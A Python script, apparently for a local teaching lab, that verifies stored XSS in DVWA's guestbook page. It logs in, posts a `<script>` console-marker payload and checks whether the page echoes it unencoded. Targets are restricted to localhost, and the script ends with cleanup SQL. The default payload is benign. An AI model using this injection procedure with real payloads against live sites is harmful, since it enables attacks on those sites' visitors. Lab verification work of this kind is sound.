#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XSS-005 (DVWA xss_s stored XSS) teaching-lab verification draft.

Only localhost / 127.0.0.1 / ::1 targets are accepted. The payload is a
harmless console marker: it does not read cookies, does not exfiltrate data and
does not install persistent control. Browser execution must be observed manually.
"""

import argparse
import http.cookiejar
import random
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
DEFAULT_PAYLOAD = "<script>console.log('LLM_LAB_XSS')</script>"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse redirects so the target host cannot drift outside the lab scope."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect refused: %s" % newurl, headers, fp
        )


def make_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect()
    )


def validate_base(base_url):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ("http", "https") or parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit("refusing non-local target: %r" % base_url)
    if parts.query or parts.fragment:
        raise SystemExit("base URL must not carry a query string or fragment")
    return base_url.rstrip("/")


def http(opener, url, data=None, timeout=10):
    body = urllib.parse.urlencode(data).encode("utf-8") if data is not None else None
    req = urllib.request.Request(url, data=body, method="POST" if body else "GET")
    if body is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        text = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, text
    except (urllib.error.URLError, TimeoutError) as exc:
        raise SystemExit("connection/timeout error for %s: %s" % (url, exc))


def main():
    ap = argparse.ArgumentParser(description="XSS-005 stored-XSS verification draft")
    ap.add_argument("--base-url", required=True, help="e.g. http://127.0.0.1/dvwa")
    ap.add_argument("--username", required=True, help="lab account, not stored")
    ap.add_argument("--password", required=True, help="lab password, not stored")
    ap.add_argument("--security", default="low",
                    choices=["low", "medium", "high", "impossible"])
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD)
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()

    base = validate_base(args.base_url)
    page = base + "/vulnerabilities/xss_s/"
    opener = make_opener()
    suffix = "%04x" % random.SystemRandom().randrange(0x10000)
    name = "LLM_LAB_" + suffix

    status, body = http(
        opener,
        base + "/login.php",
        {"username": args.username, "password": args.password, "Login": "Login"},
        args.timeout,
    )
    print("[1] login.php -> HTTP %s, %d bytes" % (status, len(body)))

    status, body = http(
        opener,
        base + "/security.php",
        {"security": args.security, "seclev_submit": "Submit"},
        args.timeout,
    )
    print("[2] security.php -> HTTP %s (requested %s)" % (status, args.security))

    status, body = http(opener, page, None, args.timeout)
    print("[3] pre-write GET -> HTTP %s, marker already present: %s"
          % (status, args.payload in body))
    if args.payload in body:
        print("    warning: marker exists before writing; pick a fresh payload")

    status, body = http(
        opener,
        page,
        {"txtName": name, "mtxMessage": args.payload, "btnSign": "Sign Guestbook"},
        args.timeout,
    )
    print("[4] write POST -> HTTP %s, %d bytes" % (status, len(body)))

    status, body = http(opener, page, None, args.timeout)
    encoded_marker = args.payload.replace("<", "&lt;").replace(">", "&gt;")
    raw = args.payload in body
    encoded = encoded_marker in body
    print("[5] re-read GET -> HTTP %s" % status)
    print("    raw marker in response      : %s" % raw)
    print("    encoded marker in response  : %s" % encoded)
    print("    dedicated test row name     : %s" % name)

    if raw:
        print("RESULT: the response echoes the unencoded marker. Open %s" % page)
        print("        in a browser and confirm the console prints LLM_LAB_XSS.")
        print("        Response text alone does NOT prove script execution.")
    elif encoded:
        print("RESULT: the marker was HTML-encoded (impossible branch?). Repeat")
        print("        with --security low|medium|high to compare configurations.")
    else:
        print("RESULT: marker not observed. Check login/session, security level,")
        print("        field names and whether the active write version is fragment A.")

    print("CLEANUP: remove only this test row, e.g. in the lab DB:")
    print("  DELETE FROM guestbook WHERE name = '%s';" % name)
    print("Do NOT press Clear Guestbook: btnClear does TRUNCATE guestbook.")


if __name__ == "__main__":
    sys.exit(main())
